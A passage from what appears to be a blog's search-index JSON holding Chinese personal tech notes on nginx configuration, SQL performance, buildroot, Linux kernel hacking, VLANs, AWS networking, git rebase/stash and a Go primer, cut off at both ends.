error\n要管理pointer\n占用大量記憶體\n\n控制可見度\n有pointer才能access，可見度很好控管\n如何access\n用pointer一路走過去\n序列化\n序列化不容易做，想想cycle-reference要怎麼辦?\n如果有共用的部分要怎麼處理?\nFORTRAN\n世界只剩下array\n有點像COBOL的折衷，因為可以用array的格子來表示結構或是union\n但是不同於COBOL我們可以有很多塊array\n控制可見度\n因為array可以拆成好幾份，來保持不同的可見度\n如何access\narray加index\n序列化\n序列化容易做\n其他\nPipe\n當世界只剩下queue\n有點像FORTRAN但是沒有index\n這個Model經常用在concurrent上，可以看go的channel或是pi calculus\nFile&amp;folder\n有點像LISP但是\n\n只能是tree(所有有分leaf與node)\n只有leaf才能放資料\n\n如何表示attribute\nfolder+many files (ex: /proc//)\nSQL\n基本上就是COBOL加LISP\nkey是pointer\ncolumn從COBOL來\n每次select都是新的matrix(FORTURN)\nRef\nThe memory models that underlie programming languages\n编程语言中的 6 种内存模型\n","categories":["PLT","Reading"]},{"title":"nginx的簡單survey","url":"/2020/8/nginx-first-note/","content":"動機\n之前有用過nginx做reverse proxy連到signal server\n提供HTTPS連線\n現在想把nginx拿來做別的事，所以先survey一下nginx的基本功能吧\n\nlocation\nexact match\n= &lt;pattern&gt;\n要剛好一樣，遇到後就停止搜尋，優先序最高\nlongest prefix match\n^~ &lt;pattern&gt;\n只要前綴符合就結束其他的比對，優先序第二高\nregex match\n~ &lt;regex&gt; or ~* &lt;regex&gt;\n可以用?&lt;name&gt;來設定變數 (Perl 5.10 compatible syntax, supported since PCRE-7.0)\n同時這個設定變數(name capture)也可以用在server_name\n優先序第三高\nprefix match\n一般常見的那種，就算把這種match寫在第一個，也會先看之後有沒有前面三種的可以match\n優先序最低，如果有regex的match就會用regex的match\nnamed location\n類似function\nlocation / &#123;\ttry_files $uri $uri/ @custom&#125;location @custom &#123; \t# ...do something&#125;\nproxy\nX-Forwarded-For &amp; Forwarded header\nX開頭的header都是自訂的header，現在有標準化就可以用標準化的header\nBefore\nX-Forwarded-For: 12.34.56.78, 23.45.67.89X-Real-IP: 12.34.56.78X-Forwarded-Host: example.comX-Forwarded-Proto: https\nAfter\nForwarded: for=12.34.56.78;host=example.com;proto=https, for=23.45.67.89\n用頓號區分ip\n在官網上有把$remote_addr (srcIP)與$http_forwarded (srcIP,port)轉成Forwardedheader的code\nmap $remote_addr $proxy_forwarded_elem &#123;    # IPv4 addresses can be sent as-is    ~^[0-9.]+$          &quot;for=$remote_addr&quot;;    # IPv6 addresses need to be bracketed and quoted    ~^[0-9A-Fa-f:.]+$   &quot;for=\\&quot;[$remote_addr]\\&quot;&quot;;    # Unix domain socket names cannot be represented in RFC 7239 syntax    default             &quot;for=unknown&quot;;&#125;map $http_forwarded $proxy_add_forwarded &#123;    # If the incoming Forwarded header is syntactically valid, append to it    &quot;~^(,[ \\\\t]*)*([!#$%&amp;&#x27;*+.^_`|~0-9A-Za-z-]+=([!#$%&amp;&#x27;*+.^_`|~0-9A-Za-z-]+|\\&quot;([\\\\t \\\\x21\\\\x23-\\\\x5B\\\\x5D-\\\\x7E\\\\x80-\\\\xFF]|\\\\\\\\[\\\\t \\\\x21-\\\\x7E\\\\x80-\\\\xFF])*\\&quot;))?(;([!#$%&amp;&#x27;*+.^_`|~0-9A-Za-z-]+=([!#$%&amp;&#x27;*+.^_`|~0-9A-Za-z-]+|\\&quot;([\\\\t \\\\x21\\\\x23-\\\\x5B\\\\x5D-\\\\x7E\\\\x80-\\\\xFF]|\\\\\\\\[\\\\t \\\\x21-\\\\x7E\\\\x80-\\\\xFF])*\\&quot;))?)*([ \\\\t]*,([ \\\\t]*([!#$%&amp;&#x27;*+.^_`|~0-9A-Za-z-]+=([!#$%&amp;&#x27;*+.^_`|~0-9A-Za-z-]+|\\&quot;([\\\\t \\\\x21\\\\x23-\\\\x5B\\\\x5D-\\\\x7E\\\\x80-\\\\xFF]|\\\\\\\\[\\\\t \\\\x21-\\\\x7E\\\\x80-\\\\xFF])*\\&quot;))?(;([!#$%&amp;&#x27;*+.^_`|~0-9A-Za-z-]+=([!#$%&amp;&#x27;*+.^_`|~0-9A-Za-z-]+|\\&quot;([\\\\t \\\\x21\\\\x23-\\\\x5B\\\\x5D-\\\\x7E\\\\x80-\\\\xFF]|\\\\\\\\[\\\\t \\\\x21-\\\\x7E\\\\x80-\\\\xFF])*\\&quot;))?)*)?)*$&quot; &quot;$http_forwarded, $proxy_forwarded_elem&quot;;    # Otherwise, replace it    default &quot;$proxy_forwarded_elem&quot;;&#125;proxy_set_header Forwarded $proxy_add_forwarded;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # Coexistence with X-\n但要注意ticket #1316的問題，$http_forwarded只會有一個for!!\nsimple example\nserver &#123;    listen myhost:80;    server_name  myhost;    location / &#123;        root /path/to/myapp/public;        proxy_set_header X-Forwarded-Host $host:$server_port;        proxy_set_header X-Forwarded-Server $host;        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;        proxy_pass http://myapp:8080;    &#125;&#125;\nredirect: rewrite, if, return, set\nset\nset $&lt;name&gt; val\nreturn &amp; break\nreturn status_code [text | URL] 或是\nreturn URL\nbreak就是break\n兩個都是讓rewrite或是if停下來，但return會丟status code與URL\nrewrite\nrewrite path1 path2 [opt]\npath1的比對值是$URI\n也就是像hi.php?a=b\npath1的pattern只會與hi.php比對\n如果需要$query_string被改寫\n要額外處理像\nif ($query_string ~* &quot;name=(.*)&quot;) &#123;      set $name $1;      rewrite /info.php /result.php?newname=$name break;      ## rewrite /info.php /result.php?newname=$1 break;&#125;\nrewrite /info.php /result.php?newname=$1 break;的坑是\n$1是看path1比對的結果\nbreak, last, redirect , perminate, 空白\n\nbreak: 不看其他的rewrite\nlast: 回到location再跑一次\nredirect: 302, 臨時的redirect\nperminate: 301, 永久的轉移\n空白: 繼續往下跑其他rewrite(好像switch阿)\n\nlast &amp; break\n借一下這裡的例子來分析\nrewrite /test2 /tt break;  location /test &#123; ## 1      rewrite /test2 /test3 break;      rewrite /test /test2 last; ## 2       rewrite /test2 /test3 break;  &#125;  location /test2 &#123; ## 3      return 508;  &#125;  location /test3 &#123;      return 503;  &#125;  ## /test =&gt; 508\n現在先把rewrite分成\nserver -&gt; locations -&gt; location\n所以在location的last，會回到上一層在跑一次比對\nrewrite /tt /index.html break;rewrite /test2 /tt last; ## 1location /test &#123;\trewrite /test2 /test3 break;\trewrite /test /test2 last;\trewrite /test2 /test3 break;&#125;location /test2 &#123;\treturn 508;&#125;location /test3 &#123;\treturn 503;&#125;location / &#123;\troot   html;\tindex  index.html index.htm;&#125;## 2 , no match## test2 =&gt; not exist\n如果把last看成回到上一層再跑一次，\nserver的last因為沒有上一層可以回去，所以她的行為與break，就是直接到下一層的比對\nif\n就是bash的if，但是沒有else的部分\n可以用location的比對像regex等等\nsafe if\n根據這裡的分析\nif會產生自己的location block，如果其中有自己的content handler，就會用，不然就繼承外面的\n整個rewrite module，會把他的directive翻成自己的指令\n先跑自己所有的指令後才跑其他的directive\n像\nlocation /if-try-files &#123;     try_files  /file  @fallback; ## wont work     set $true 1;     if ($true) &#123; ## here is new location!! forget previous location         # nothing     &#125;&#125;\n所以安全使用if的原則是\n\nif中盡量只放rewrite module的directive\n把所有if放在非rewrite module的directive前面\n或是用其他directive取代if，像if(-f ...)換成try_files\n\nVirtual Host\n想像有很多nginx.conf(對應一台主機)\n都放在sites-available\n而實際對外看到的就是在sites-enabled中有symbol link的conf\nXSendfile (X-Accel)\n就是當網站要送檔案時可以直接用header的內容來告訴nginx去送某個檔案。\n而不是把檔案放在body中再丟出去\n## /protected/iso.imglocation /protected/ &#123; internal; root   /some/path;    ## path: /some/path/protected/iso.img ## alias /some/path/; ## path: /some/path/iso.img&#125;\nbasic server conf\nserver &#123;    listen 8080;    root /data/up1; #從哪邊開始找檔案    location / &#123;\tfastcgi_pass  localhost:9000; # fastcgi的server在哪?        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; # 與bash串接string的方式一樣        fastcgi_param QUERY_STRING    $query_string;    &#125;    location ~ \\.(gif|jpg|png)$ &#123;        root /data/images;    &#125;&#125;\nfull example\nuser       www www;  ## Default: nobodyworker_processes  5;  ## Default: 1, 能開幾個processerror_log  logs/error.log;pid        logs/nginx.pid;worker_rlimit_nofile 8192; ## 一個process最多能開幾個檔案events &#123; ## 處理與接收連線有關的參數，實際連線(socket)的參數要去http調  worker_connections  4096;  ## Default: 1024 一個process最多能accept幾條連線&#125;http &#123;  include    conf/mime.types; ## include就是macro展開  include    /etc/nginx/proxy.conf;  include    /etc/nginx/fastcgi.conf;  index    index.html index.htm index.php;  default_type application/octet-stream;  log_format   main &#x27;$remote_addr - $remote_user [$time_local]  $status &#x27;    &#x27;&quot;$request&quot; $body_bytes_sent &quot;$http_referer&quot; &#x27;    &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;  server_tokens off; ## 在錯誤頁面顯示nginx的版本號?  access_log   logs/access.log  main;  ## 可以調tcp的參數  sendfile     on; ## 類似splice，實現zerocopy  tcp_nopush   on; ## TCP_CORK，等到tcp pkt到一定大小，再丟出封包  server_names_hash_bucket_size 128; # this seems to be required for some vhosts  ## 壓縮  gzip on;  gzip_vary on; ## vary是cache的key的額外key  gzip_disable &quot;msie6&quot;;  gzip_proxied any; ## 找有沒有壓縮過的  gzip_min_length 1000;   gzip_comp_level 6;  gzip_types text/plain text/css application/json application/x-javascript text/xml application/xml application/xml+rss text/javascript;  server &#123; # php/fastcgi    listen       80;    server_name  domain1.com www.domain1.com;    access_log   logs/domain1.access.log  main;    root         html;    location ~ \\.php$ &#123;      fastcgi_pass   127.0.0.1:1025;    &#125;  &#125;  server &#123; # simple reverse-proxy    listen       80;    server_name  domain2.com www.domain2.com;    access_log   logs/domain2.access.log  main;    # serve static files    location ~ ^/(images|javascript|js|css|flash|media|static)/  &#123;      root    /var/www/virtual/big.server.com/htdocs;      expires 30d;    &#125;    # pass requests for dynamic content to rails/turbogears/zope, et al    location / &#123;      proxy_pass      http://127.0.0.1:8080;    &#125;  &#125;  upstream big_server_com &#123; ## 做簡單的load balance，用rr    server 127.0.0.3:8000 weight=5;    server 127.0.0.3:8001 weight=5;    server 192.168.0.1:8000;    server 192.168.0.1:8001;  &#125;  server &#123; # simple load balancing    listen          80;    server_name     big.server.com;    access_log      logs/big.server.access.log main;    location / &#123;      proxy_pass      http://big_server_com;    &#125;  &#125;&#125;\nRef\nnginx beginner\nfull example\nadvanced conf\nserver name\nforwarded\nrewrite_module\nif is eval\nrewrite &amp; query_string\nbunch of NGINX var list\nx-accel\n","categories":["Rails","Tips"]},{"title":"sql效能survey","url":"/2020/8/sql-performance/","content":"動機\nsql的效能議題好像不常被提起\n十分niche\n那就來整理看看\n\n原則\n優先序由上往下\n\n用index過的所有column(也只有被index過的)去select\n如果需要反覆存取的資料上index與放到temp table\n壓低要做操作的資料量\n\n真的要用select *嗎?\n通常不會需要所有的column，選需要的出來就好\n避免用distinct\n如果可以就select更多column出來就好\n用join去join，不要用where去做\n如果用where去做就是cross join，會讓資料量變大\n效率自然就下去了\n能用where去過濾的就用where\nhaving只用在aggregate function的過濾\n從sql的執行順序來看，因為where會先把資料量壓小\n所以可以的話把條件放在where\n\nwildcard只用在pattern最後面，如果只比對開頭的字串的話\n是合理啦\n但如果是要最尾的話，只放wildcard在前面效能也話比較好嗎\n用limit(或top,FETCH FIRST，看DBMS)限制query出的數目，尤其是只想看個大概的時候\nlimit在sql的執行順序不是最高的，但是sql engine會知道不用撈整個table\n這樣可以把資料量往下壓\n把outer join換成空值+inner join\n原本outer join會在不存在的column留下null\n可以把null換成某個空值，這樣就可以用inner join\n像是下面表的NO CUSTOMER\n\n\n\nCUSTOMER_ID\nCUSTOMER_NAME\n\n\n\n\n0\nNO CUSTOMER\n\n\n1\nJohn Doe\n\n\n2\nMary Jane\n\n\n3\nPeter Pan\n\n\n4\nJoe Soap\n\n\n\n\n\n\nCUSTOMER_ID\nSALES_PERSON\n\n\n\n\n0\nNewbee Smith\n\n\n2\nOldie Jones\n\n\n1\nAnother Oldie\n\n\n0\nGreenhorn\n\n\n\n把在join或是where中需要運算的部分放到row中\n就是先算好\nBefore\nSELECT *FROM sales a JOIN budget b ON    ((year(a.sale_date)* 100) + month(a.sale_date)) = b.budget_year_month\nAfter\nSELECT * FROM PRODUCTSFROM sales a JOIN budget b ON    a.sale_year_month = b.budget_year_month\navoid n+1\n要select或是update等等\n就直接用sql一次做完\n不要分成一次一個，DBMS不是記憶體，沒那麼快\nsubquery不要放在select的column中\n這樣的話每一次select出新的row都要subquery一次\n如下\nSELECT c.Name,        c.City,       (SELECT CompanyName FROM Company WHERE ID = c.CompanyID) AS CompanyName FROM Customer c\n用join取代\nSELECT c.Name,        c.City,        co.CompanyName FROM Customer c \tLEFT JOIN Company co\t\tON c.CompanyID = co.CompanyID\n用exists來取代aggregate function，確認資料是否存在\nBefore\nIF (SELECT COUNT(1) FROM EMPLOYEES WHERE FIRSTNAME LIKE &#x27;%JOHN%&#x27;) &gt; 0    PRINT &#x27;YES&#x27; \nAfter\nIF EXISTS(SELECT FIRSTNAME FROM EMPLOYEES WHERE FIRSTNAME LIKE &#x27;%JOHN%&#x27;)    PRINT &#x27;YES&#x27;\n如果一行做不完，用temp table存\n如下\nSELECT * INTO #Temp FROM Customer WHERE RegionID = 5SELECT r.RegionName, t.Name FROM Region r JOIN #Temp t ON t.RegionID = r.RegionID\n或是\ntable變數(根據soruce5，這個效能比較好)\nDECLARE @AAAA TABLE \t(\tA1\tINT IDENTITY(1,1) PRIMARY KEY,\t\tA2\tVARCHAR(128),\t\tA3\tVARCHAR(128)\t)-- temp變數是這個-- CREATE TABLE #AAAA-- \t(\tA1\tINT IDENTITY(1,1) PRIMARY KEY,-- \t\tA2\tVARCHAR(128),-- \t\tA3\tVARCHAR(128)-- \t)\nIndex\nIndex哪些column\n\nIndex完之後就不要一直改那些column的值\n不然Btree是建心酸的嗎\n在where或是order by中用index過的column\nCREATE INDEX tbl_idx ON tbl (a, date_column)SELECT *  FROM tbl WHERE a = 12 ORDER BY date_column DESC LIMIT 1\n只有a與date_column在where與order by中，所以DBMS可以直接撈index的結果\nindex從左到右\nCREATE INDEX tbl_idx ON tbl (a, b)SELECT *  FROM tbl WHERE a = 38   AND b = 1SELECT *  FROM tbl WHERE b = 1\n第二個select就吃不到index的好處因為第一個index是a\n只用index過的column\nCREATE INDEX tbl_idx ON tbl (a, date_column)SELECT date_column, count(*)  FROM tbl WHERE a = 38   AND b = 1 GROUP BY date_column\n因為b所以DBMS沒辦法從index過的結果拉資料，要去看table\n如何tuning\n\nExecution Plan\nMonitor Resource Usage\nSQL DMVs\nprofiler\nSQL SYNTAX EXPLAIN\n\nRef\nsource1\nsource2\nsource3\nsource4\nsoruce5\n","categories":["DB","FAQ"]},{"title":"奇聞軼事-buildroot的坑","url":"/2020/8/strange-note-buildroot/","content":"動機\n記下把buildroot原本的package用成自己的時候遇到的坑\n\nbzcat is not a bzip2 file\n原本buildroot對於下載回來的tar檔都會有自己的檔名\n而buildroot解壓tar檔都是看檔名，像\ntar.bz2會用bzip2的方式解壓\ntar.gz會用gzip的方式解壓\n但如果檔名給錯就會出事\n用file可以看到\ntooy@root:~$ file master.tar.bz2master.tar.bz2: Zip archive data, at least v1.0 to extract\n如果port成自己的package在mk要加\n...MYPKG_SOURCE = mypkg-$(MYPKG_VERSION).zip...\nautoconf 沒有跑\n加入\n...MYPKG_AUTORECONF = YES...\n到mk檔，就會跑autoconf了\nRef\nfile man\n","categories":["System","Linux","Tips"]},{"title":"奇聞軼事 - 死掉的write","url":"/2020/8/strange-things-blocked-write/","content":"動機\n兩條thread對兩個socket fd做讀寫(一讀一寫、一寫一讀)，等另外一邊結束後\n另一條thread沒辦法結束join\n\n原因\n另一條沒辦法結束的thread卡在write上\n沒有任何報錯就是卡在write一直不跳出去\n(感覺是kernel的錯，用一般原始的kernel就沒事)\n明明fd都關了另一邊卻看不到，感覺遇到了可見性問題\n根據查的資料，close沒有thread-safe\n解法\n用cond var，來通知main thread把另一條砍掉\n坑: transfer of control bypasses initialization of\n如果用cpp11的cond var，加上goto，就會有這個錯誤\n用pthread的cond var就ok了\n查看程式開的fd\ncat /proc/&lt;pid&gt;\n寫在後面\n如果用message passing，而不是用2條thread去做會不會比較好\n這樣thread就不用負擔管理fd的任務\nRef\nclose-thread-safe\n","categories":["System","Linux","Tips"]},{"title":"奇聞軼事 - 把程式port到其他或舊平台運行","url":"/2020/8/strange-things-port-to/","content":"動機\n很多時候會需要把一些trace或是測試的程式放到舊平台或是其他平台運行\n所以記一下遇過的坑\n\n坑: shared object\n就是在/usr/lib的so\n第一個情境是怎麼找需要的so?\n用ldd\n第二個是如果他需要的版本比較舊的話?\n用symbol link，但是要注意不要動到重要的so，\n像c的runtime(libc)\n第三個是so放哪?\n一個是/usr/lib\n不然就是用LD_LIBRARY_PATH\n像這樣\nLD_LIBRARY_PATH=&quot;/path/you/want1:/path/you/want/2&quot; ./a.out\n坑: compile\n如果真的只能compile，要注意當時的環境\n最好用當時compiler的版本\n通常用新compiler去編舊程式都會報錯\n大多時候都是像type對不起來的問題\n但處理起來很煩\n寫在後面\n順便記一下好用的trace工具\n\nstrace: 追userspace程式的system call\npstack: 追call stack\nsystemtap: 追kernel的function call\n\nRef\ngood chinese linux tool refbook\n","categories":["System","Linux","Tips"]},{"title":"改kernel的注意事項","url":"/2020/8/tips-when-hacking-kernel/","content":"動機\n改kernel的心得\n\n備妥工具\nvscode與trace tool\nvscode的調整: 減少搜尋的範圍\n&#123;    &quot;search.exclude&quot;: &#123;\t// 保留要改的部分，其他不要看        &quot;**/.git&quot;: true,        &quot;**/.svn&quot;: true,        &quot;**/.DS_Store&quot;: true,        &quot;**/drivers&quot;: true,        &quot;**/sound&quot;: true,        &quot;**/tools&quot;: true,        &quot;**/arch/alpha&quot;: true,        &quot;**/arch/arc&quot;: true,        &quot;**/arch/c6x&quot;: true,        &quot;**/arch/h8300&quot;: true,        &quot;**/arch/hexagon&quot;: true,        &quot;**/arch/ia64&quot;: true,        &quot;**/arch/m32r&quot;: true,        &quot;**/arch/m68k&quot;: true,        &quot;**/arch/microblaze&quot;: true,        &quot;**/arch/mn10300&quot;: true,        &quot;**/arch/nds32&quot;: true,        &quot;**/arch/nios2&quot;: true,        &quot;**/arch/parisc&quot;: true,        &quot;**/arch/powerpc&quot;: true,        &quot;**/arch/s390&quot;: true,        &quot;**/arch/sparc&quot;: true,        &quot;**/arch/score&quot;: true,        &quot;**/arch/sh&quot;: true,        &quot;**/arch/um&quot;: true,        &quot;**/arch/unicore32&quot;: true,        &quot;**/arch/xtensa&quot;: true    &#125;,    //-------- Files configuration --------    // Configure glob patterns for excluding files and folders.    &quot;files.exclude&quot;: &#123;        &quot;**/.git&quot;: true,        &quot;**/.svn&quot;: true,        &quot;**/.DS_Store&quot;: true,        &quot;**/drivers&quot;: true,        &quot;**/sound&quot;: true,        &quot;**/tools&quot;: true,        &quot;**/arch/alpha&quot;: true,        &quot;**/arch/arc&quot;: true,        &quot;**/arch/c6x&quot;: true,        &quot;**/arch/h8300&quot;: true,        &quot;**/arch/hexagon&quot;: true,        &quot;**/arch/ia64&quot;: true,        &quot;**/arch/m32r&quot;: true,        &quot;**/arch/m68k&quot;: true,        &quot;**/arch/microblaze&quot;: true,        &quot;**/arch/mn10300&quot;: true,        &quot;**/arch/nds32&quot;: true,        &quot;**/arch/nios2&quot;: true,        &quot;**/arch/parisc&quot;: true,        &quot;**/arch/powerpc&quot;: true,        &quot;**/arch/s390&quot;: true,        &quot;**/arch/sparc&quot;: true,        &quot;**/arch/score&quot;: true,        &quot;**/arch/sh&quot;: true,        &quot;**/arch/um&quot;: true,        &quot;**/arch/unicore32&quot;: true,        &quot;**/arch/xtensa&quot;: true    &#125;&#125;\nvscode的調整: includePath\n&#123;    &quot;configurations&quot;: [        &#123;            &quot;name&quot;: &quot;Linux&quot;,            &quot;includePath&quot;: [                &quot;$&#123;workspaceFolder&#125;/arch/arm64/include/**&quot;,                &quot;$&#123;workspaceFolder&#125;/include/**&quot;,                &quot;$&#123;workspaceFolder&#125;/arch/arm64/**&quot;,                &quot;$&#123;workspaceFolder&#125;/**&quot;            ],            &quot;defines&quot;: [],            &quot;compilerPath&quot;: &quot;/usr/bin/gcc&quot;,            &quot;cStandard&quot;: &quot;c11&quot;,            &quot;cppStandard&quot;: &quot;c++17&quot;,            &quot;intelliSenseMode&quot;: &quot;clang-x64&quot;        &#125;    ],    &quot;version&quot;: 4&#125;\n如果調整vscode還是太慢: GUN Global\n裝GUN Global\nsudo apt install global\n裝外掛: C/C++ GNU Global\nF12再打Global: Rebuild Gtags Database\n但我自己用的時候，找reference時出現的item都會重複一次，像\nvoid a(...)void a(...)void b(...)void b(...)...\n注意: trace tool還是有可能翻車\n像我是用cpptool去找\n結果他找xt_mark.h，就帶到錯的地方，\n是用global才找到原來還有其他的地方也又xt_mark.h\npatch\nlinux kernel的資料夾很多，如果改的檔案很多又很分散，apply修改的結果會很累\n用patch代勞\ngit add . #全部加到stagegit diff --staged &gt; edit.diffmv edit.diff to_some_wherecd to_some_where #optionalgit apply -v &lt; edit.diff\n一步一步來\n一次改一小步，不然很多時候會出現意想不到的錯誤\n也不知道要從何改起\n保留後路\n一定要保留一個可以還原回去可以用的環境的手段\n不然改爆就去世了\n錯誤訊息是你的好友\n只要不是像SegmentFault那種不知道到底發生事的錯誤訊息\n就是好錯誤訊息\n可以利用這個錯誤訊息去trace，找到需要改的地方\n猜\n通常不會等code全部看完再去改，一般都是一邊改一邊猜大概是怎麼實現的，\n也是一邊改一邊了解到底在幹嘛\n不要被嚇到\nkernel code會有許多神奇的手法\n像tcp的skb的繼承是用struct一層包一層\n或是ipset是用header file來做繼承(幹，超難debug)\n要把握這部分的code的目的是什麼，然後先跳過神奇的部分，\n專注在code如何完成功能上\nGoogle it\n知名的kernel code可以賭會有人trace過\n可以去看看前人的紀錄，給自己一點改與trace的線索與直覺\nRef\nvscode的調整\nvscode與GUN Global\n","categories":["System","Linux","Tips"]},{"title":"vlan筆記","url":"/2020/8/vlan-note/","content":"動機\n想大概了解vlan到底是什麼\n\nLayer2\n原本layer2，只要在同一台switch下大家都是一樣的\n都在同一個廣播域下\n區分Layer2\n如果想區分就要加個符號來識別\n所以有了vlan tag\n排列組合\n前提: 只有switch才對vlan tag做判斷\n封包: 有/無 tag\nport:\n\n在收的時候:\n\n要不要幫打tag\n要不要drop =&gt; 符合 某個Tag 或是 在whitelist 中\n\n\n在送的時候:\n\n要不要把tag拿掉 (要變回原本的layer2封包)\n\n\n\naccess, thunk, hybrid port\nport都有預設的vlan tag，幫沒有tag的封包打一個tag\naccess port就是對內的port，所以\n\n收的時候會看是不是自己這個廣播域的vlan tag\n送出去時會把tag拿掉，就像原本的layer2\n\nthunk port是與其他switch連接的port，所以\n\n收的時候會看是不是要處理的廣播域，也就是看tag是不是可以收的\n送出去時只有在tag是自己的廣播域的tag時，會把tag拿掉，其他就保留\n\nhybrid port基本上就是thunk port，但\n即便是tag與自己廣播域的tag相同，也不會把tag拿掉\n","categories":["Network","Tips"]},{"title":"web api格式(?)的簡單比較","url":"/2020/8/web-api-def/","content":"動機\n單純的紀錄想法\n\nSOAP &amp; RESTful\n把SOAP與RESTful用PL的角度其實很清楚\nSOAP需要caller知道有什麼method可以用，其實就是【物件的方法調用】\nRESTful每個東西都有自己的id，同時還有state只在調用api後才有可能改變，這就是【array】\n\n\n\n\nlike ___ in PL\nthe amount of method(verb)\nstate\nrelation between caller &amp; callee\ndata type\n\n\n\n\nRESTful\nArray\n7\nserver\nmaster &amp; slave\nJSON/XML…\n\n\nSOAP\nobj method invoke\ndepend on design\nserver &amp; client\ndepend on design\nXML\n\n\n\nRESTful &amp; graphql\ngraphql就是SQL的變種，\n可以預想之後會變得越來越像SQL，\n就像C++的smart pointer與各個語言中的lambda function一樣\ngraphql的最大好處是【可以預先知道回傳回來的資料裡面有什麼】\n如果是RESTful要等到server回傳parse後才能知道有什麼item，再根據資料再發request，十分的浪費頻寬\n這是前端的勝利!!\n但是，是後端的不幸\n後端頓時要做與DB一樣的事，除了從原本的DB拉資料，再透過商業邏輯轉換後，還要組合出graphql給定的格式!!\n後端複雜度上升，同時快取也不好處理，每次的request都是不同的結構，這樣要如何選定快取的key?\n","categories":["Rails","FAQ"]},{"title":"aws的網路(與一點IAM)","url":"/2020/9/aws-network/","content":"動機\n感覺大家常用，就做個筆記\n\n與主機很像\n\nAZ可以看成在同一地區的data center cluster\nregion可以看成data center\nVPC可以看成data center中的server\nsubnet可以看成server中的network namespace\ninstance可以看成process\n所以可以看成\nsubnet是network namespace，因此會有自己的network stack，所以network ACL可以看成iptables，routing table就是namespace自己的routing table\n(因為subnet是network namespace，所以可以透過控制VPC的routing table或是subnet的routing table來讓subnet的流量出不去，這樣就可以區分public, private)\n(也因為network ACL可以看成iptables，所以他自然是所謂的unstateful，去與回是分開的)\n(注意到，一般firewal的stateful是可以依據會變化的資料來過濾，像tcp connection state之類的)\nVPC是data center中的server，因此會有自己的network stack，所以router可以看成server上的routing table\nVPC是data center中的server，同時region是data center，所以internet gateway與virtual network gateway就是物理上的router(同時具備VPN功能)\n那security group呢?\niptables的自製chain，一個就一個chain\n(所以security group可以是無序的，因為只能allow，就無關順序)\n(也因為security group是無序的，所以rule一次eval掉都沒關係)\n(因為security group是自製chain，所以可以自動處理reply的流量，stateful)\nXX就是…\nDirect Connect是放一台router直接接到能到aws的router上，同時有兩條VPN一個入(Customer Gateway)一個出(Virtual Private Gateway)\nPrivate Link是在server的iptables與routing table上直接把資料導到aws的其他服務\n(VPC endpoint 是透過 PrivateLink 的方式提供的)\nVPC Peering是server直接對接(或是VPN? 因為可以跨region)\nTransit gateway是server之間再拉一台router來接(星狀topo)\nVPC Sharing是subnet之間在VPC的routing table打有關的routing rule(like docker network)\nVPC Peering &amp; Transit gateway &amp; VPC Sharing\n從互聯的單位來看\nVPC Peering: VPC(server對server)\nTransit gateway: VPC(server對server)\nVPC Sharing: subnet(subnet對subnet)\n附錄: IAM\n\nRBAC(Role-Based Access Control) 設計的，可以建立 User/Group\n四種組成成分\na. User: 使用者\nb. Group: 一群使用者(類似法人的感覺)\nc. Roles: 角色 (他是IAM中的實體，但他沒有password 或 access keys，不能登入)\nd. Policies: 濾鏡\n\nIdentity-based policies: 帶在 User/group/role 身上\nResource-based policies: 帶在 資源 身上\n\n\n可以看成User/group/role透過Policies作為aws的濾鏡，所以每個user/group/role看到的aws資源都不一樣\na. User/Group/Roles ==&gt; Policies --&gt; 資源\n識別aws資源: ARN (Amazon Resource Names)\na. \n\nRef\nVPC1\nVPC2\nVPC3\nIAM1\nIAM2\nAWS network fundamental\n","categories":["Network","FAQ"]},{"title":"與log一起debug","url":"/2020/9/debug-with-log/","content":"動機\n最近都在看log來找bug…\n記下一些心得\n\n心得\n\n\npid與tid很重要\ntid除了pthread有tid但是linux其實也有tid，但這個tid是可以區分pid與pthread的tid\n\n\n時間很重要\n針對code除錯會看stacktrace看function call的順序\n但如果是multi-thread或是多程式互相依賴，這時間就很重要\n\n\n同時，時間的單位要到毫秒，有的時候單位只有秒是區分不出來先後順序的\n\nlog本身也有可能出事\n如果只用cout可能無法看出實際上的執行順序，string有時候會被cache，記得加endl\n\n可以用其他logger，不過有遇到一個神奇的case是在ARM上，logger會在使用pthread_join或pthread_cancel的地方卡住，感覺是logger自己的mutex與pthread互撞\n下面有oops的地方都有因futex而卡住的可能性…\nLOG(DEBUG) &lt;&lt; &quot;Oops&quot;;pthread_cancel(...)LOG(DEBUG) &lt;&lt; &quot;Oops&quot;;pthread_join(...)LOG(DEBUG) &lt;&lt; &quot;Oops&quot;;\n所以用logger也有可能會出事，十分弔詭。\n這個時候只能一步一步排除了…\n","categories":["System","Linux","Tips"]},{"title":"git rebase 與 stash","url":"/2020/9/git-rebase-stash/","content":"動機\n之前上code，因為各種因素，修與加了許多分散的功能\n都分散在不同的小commit中，但總不能在code review與push時上一堆零散的commit\n所以有了這篇\n\nrebase\n可以讓你從起點commit開始往下修commit\n可以合併與分割commit\n合併很簡單，所以這邊特別說分割commit的手法\n分割commit\n\n把檔案從commit拉回來: git reset HEAD^\n照常add與commit\n\n但如果只想commit其中一些檔案的某些部份?\n就要設法把untracked狀態保留下來，以及只選擇性的stage部分內容\n先談untracked狀態保留\n保留untracked&amp;staged: stash\n可以利用stash把untracked&amp;staged狀態存下來，\n等之後的需要再pop出來，就是commit之前的狀態\n但這裡是會把staged都保留下來，但我們只要untracked的保留\n所以要\n\n只存staged: git stash -u\n存untracked&amp;staged: git stash -k OR git stash --keep-index\n\n之後就是pop了\n再來就是選擇性的stage部分內容\n選擇性的stage部分內容\ngit add --patch &lt;yourfile&gt; OR git add -p &lt;yourfile&gt;\n在stage的過程中可以用\n\ny stage this hunk for the next commit\nn do not stage this hunk for the next commit\nq quit; do not stage this hunk or any of the remaining hunks\nj leave this hunk undecided, see next undecided hunk\nk leave this hunk undecided, see previous undecided hunk\ns split the current hunk into smaller hunks\ne manually edit the current hunk\n\nRef\nCommit only part of a file in Git\nGit stash uncached: how to put away all unstaged changes?\nHow do you stash an untracked file?\n【狀況題】把一個 Commit 拆解成多個 Commit\n","categories":["Utils","Git"]},{"title":"初見golang","url":"/2020/9/go-first-step/","content":"動機\n據說最近會用golang來做side project\n所以來看看基本語法以及基本的backend用法(沒有DB與CURD)\n\n基本語法\ncomment\n// Single line comment/* Multi- line comment */\ncondition &amp; loop\nif num := 9; num &lt; 0 &#123; // 誠心建議，不要用這種語法!!\tfmt.Println(num, &quot;is 